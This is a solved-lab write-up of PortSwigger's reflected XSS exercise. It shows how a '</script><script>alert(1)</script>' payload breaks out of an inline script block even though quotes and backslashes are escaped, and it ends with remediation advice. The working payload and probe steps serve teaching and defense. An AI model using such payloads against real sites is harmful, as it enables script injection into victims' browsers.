# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

## Overview

- **Category:** Cross-Site Scripting (Reflected XSS / JavaScript String Context)
- **Difficulty:** Apprentice
- **Platform:** PortSwigger Web Security Academy
- **Status:** Solved

This lab reflects user search input inside a single-quoted JavaScript string variable within an inline `<script>` block. Although the application properly escapes both single quotes (`'` → `\'`) and backslashes (`\` → `\\`)—preventing direct breakout from the JavaScript string literal at the JS lexer level—it fails to encode or escape angle brackets (`<` and `>`). Because the browser's HTML parser processes `<script>` tags before handing their contents over to the JavaScript engine, injecting a closing `</script>` sequence prematurely terminates the existing script block and allows arbitrary HTML/JavaScript injection.

---

## Attack Scenario & Mental Model

```text
ATTACKER GOAL
  Execute alert(1) in the browser via Reflected XSS
      ↓
VICTIM / DELIVERY
  User visiting a crafted search URL (`/?search=...`)
      ↓
SOURCE
  URL query parameter: GET /?search=...
      ↓
CONTEXT & ESCAPE ANALYSIS
  Input is reflected inside an inline `<script>` block:
  var searchTerms = 'USER_INPUT';
  - Single quotes (`'`) are escaped as `\'`
  - Backslashes (`\`) are escaped as `\\`
  - Angle brackets (`<` and `>`) are NOT encoded!
      ↓
PARSER DIFFERENTIAL (HTML Parser vs. JavaScript Engine)
  When the browser parses an HTML document, the HTML parser runs first.
  Inside a `<script>` state, the HTML parser ignores JavaScript string quotes
  and immediately closes the script element as soon as it encounters the literal
  character sequence `</script>`.
      ↓
INJECTION / SINK
  Payload: </script><script>alert(1)</script>
  Rendered HTML:
  <script>
      var searchTerms = '</script><script>alert(1)</script>';
      ...
  </script>
      ↓
BROWSER BEHAVIOR
  1. The first `<script>` block is closed early at `var searchTerms = '`
     (throwing a harmless syntax error).
  2. The injected `<script>alert(1)</script>` is parsed and executed as a
     brand-new script element in the HTML context.
      ↓
IMPACT
  Arbitrary JavaScript execution (`alert(1)`) in the victim's browser context.
```

---

## Step-by-Step Walkthrough

### 1. Probing the JavaScript Reflection Context
Submitted a probe string containing quotes, a backslash, and angle brackets in the search box:

```text
test'\<>
```

Inspected the raw HTML response in Burp Suite:

```html
<script>
    var searchTerms = 'test\'\\<>';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Observation:
- Both `'` and `\` are escaped (`\'` and `\\`), so we cannot break out of `'...'` within the JavaScript string context.
- Angle brackets `<` and `>` remain completely unescaped.

### 2. Breaking Out of the `<script>` Block via HTML Parsing
Submitted the following payload to close the inline `<script>` tag and open a new one:

```html
</script><script>alert(1)</script>
```

The server returned:

```html
<script>
    var searchTerms = '</script><script>alert(1)</script>';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

The browser's HTML parser closed the initial script block upon seeing `</script>` and immediately executed `<script>alert(1)</script>`, solving the lab.

---

## Key Takeaways & Remediation

### Why Escaping Quotes Alone Does Not Secure Inline `<script>` Blocks
In HTML specification parsing rules, the `<script>` data state only looks for the `</script>` end-tag token and has no awareness of JavaScript syntax or string literals. Even if a string is properly quoted and backslash-escaped for JavaScript, an unescaped `</script>` substring allows an attacker to escape back into the raw HTML document context.

### Remediation
- **Avoid Interpolating User Data Directly into Code:** Pass dynamic data via `data-*` HTML attributes or dedicated `<script type="application/json">` blocks parsed with `JSON.parse()`.
- **Escape Forward Slashes or Unicode-Encode Angle Brackets:** When serializing data into inline `<script>` blocks, always escape `/` as `\/` (turning `</script>` into `<\/script>`) or Unicode-escape `<` and `>` as `\u003c` and `\u003e`.
